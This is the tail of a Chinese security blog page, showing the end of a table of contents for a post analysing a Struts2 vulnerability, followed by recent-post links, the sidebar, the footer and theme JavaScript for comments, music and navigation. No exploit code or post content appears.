href="#%E5%80%BC%E6%A0%88%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">3.3.1.</span> <span class="toc-text">值栈的作用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#request%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%80%BC%E6%A0%88"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">request中获取值栈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#actioncontext%E4%B8%AD%E8%8E%B7%E5%8F%96%E5%80%BC%E6%A0%88"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">ActionContext中获取值栈</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#struts2-%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">3.4.</span> <span class="toc-text">Struts2 执行流程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80"><span class="toc-number">4.3.1.</span> <span class="toc-text">问题一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C"><span class="toc-number">4.3.2.</span> <span class="toc-text">问题二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞修复</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-poc%E9%87%87%E9%9B%86"><span class="toc-number">6.</span> <span class="toc-text">0x06 Poc采集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>